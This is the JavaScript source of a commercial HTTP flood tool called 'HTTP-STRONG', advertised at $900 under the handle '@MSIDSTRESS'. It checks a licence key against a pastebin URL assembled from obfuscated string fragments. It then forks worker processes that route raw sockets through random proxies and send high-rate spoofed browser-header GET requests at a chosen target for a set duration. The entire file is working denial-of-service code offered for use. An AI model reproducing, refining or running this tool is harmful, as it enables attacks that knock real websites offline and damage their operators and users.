const url = require('url'),
    fs = require('fs'),
	gradient = require('gradient-string'),
	EventEmitter = require('events'),
    cluster = require('cluster'),
	requests = require('request'),
    { HeaderGenerator } = require('header-generator');
	
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);	

const sdasd = 'https://'
const qaiwdhjuwdj = 'p';
const uqwdf = 'aste';
const msidstressgay = 'bin';
const meowgay = '.';
const meowmsidstressgay = 'c';
const kkkkkkkkas = 'om';
const rawseajd = '/ra';
const aosdokawod = 'w/';
const oooooaasdas = 'b5UuNZRL';
protone = {
    url: sdasd + qaiwdhjuwdj + uqwdf + msidstressgay + meowgay + meowmsidstressgay + kkkkkkkkas + rawseajd + aosdokawod + oooooaasdas
};

function getArgs() {
    const _0 = {};
    process.argv.slice(2, process.argv.length).forEach((_1) => {
        if (_1.slice(0, 2) === '--') {
            const _3 = _1.split('=');
            const _4 = _3[0].slice(2, _3[0].length);
            const _5 = _3.length > 1 ? _3[1] : true;
            _0[_4] = _5
        } else {
            if (_1[0] === '-') {
                const _2 = _1.slice(1, _1.length).split('');
                _2.forEach((_1) => {
                    _0[_1] = true
                })
            }
        }
    });
    return _0
}
const args = getArgs();



var target = args['target'];
var time = args['time'];
var threads = args['threads'];
var ratelimit = args['requests'];
var proxyfile = args['proxy'];	


if(args['debug'] == 'true') {
	process.on('uncaughtException', function(error) {console.log(error)});
	
	process.on('unhandledRejection', function(error) {console.log(error)})
	
} else { 
	process.on('uncaughtException', function(error) {});
	
	process.on('unhandledRejection', function(error) {})
	
}

let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "firefox", minVersion: 100, httpVersion: "1"},
    ],
    devices: [
        "desktop"
    ],
    operatingSystems: [
        "windows"
    ],
    locales: ["en-US", "en"]
});

if (args['key'] != undefined & args['target'] != undefined & args['time'] != undefined & args['threads'] != undefined & args['requests'] != undefined & args['proxy'] != undefined) {
	
    requests["get"](protone, function(one, two, three) {
		
        if (args['key'] == three) {	
			if (cluster.isPrimary) {
				for (let i = 0; i < threads; i++) {
					cluster.fork();
				}
				cluster.on('exit', (worker, code, signal) => {});
			} else {
				main();
			}		
			
        } else {
			
            console.log(gradient('orange', 'white')('You no buy HTTP-STRONG | Price 900$ | @MSIDSTRESS'));
			
        }
		
    })
	
} else {
	
    console.log(gradient('orange', 'white')('./strong --key= --taret= --time= --threads= --requests= | @MSIDSTRESS'));
	
    process.exit(-1);
	
}



function main() {
	function flood() {
        let randomHeaders = headerGenerator.getHeaders();
		var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
		var parsed = url.parse(target);	
		
		setInterval( () => {
			var ads = proxies[Math.floor(Math.random() * proxies.length)];
			ads = ads.split(':');			
			var req = require('net').Socket();
			req.connect(ads[1], ads[0]);
			req.setTimeout(10000);
			for(let i = 0; i < ratelimit; i++) {
				try {									
					req.write('GET ' 
					+ target 
					+ ' HTTP/1.1\r\nHost: ' 
					+ parsed.host 
					+ '\r\nAccept: ' 
					+ randomHeaders['accept']
					+ '\r\nAccept-Language: ' 
					+ randomHeaders['accept-language']
					+ '\r\nAccept-Encoding: ' 
					+ randomHeaders['accept-encoding']					
					+ '\r\nSec-Ch-Ua-Platform: "Windows"' 					
					+ '\r\nSec-Fetch-Dest: ' 
					+ randomHeaders['sec-fetch-dest']
					+ '\r\nSec-Fetch-Mode: ' 
					+ randomHeaders['sec-fetch-mode']
					+ '\r\nSec-Fetch-Site: ' 
					+ randomHeaders['sec-fetch-site']
					+ '\r\nSec-Fetch-User: ?1' 	
					+ '\r\nUpgrade-Insecure-Requests: 1'
					+ '\r\nTE: trailers'					
					+ '\r\nConnection: Keep-Alive'
					+ '\r\nUser-Agent:' 
					+ randomHeaders['user-agent'] 
					+ '\r\n\r\n');		

				} catch (t) {}				
				
			}
		})
	}
	setInterval(flood);
	setTimeout(function() {
		console.clear();
		process.exit()
	}, time * 1000);
}
	
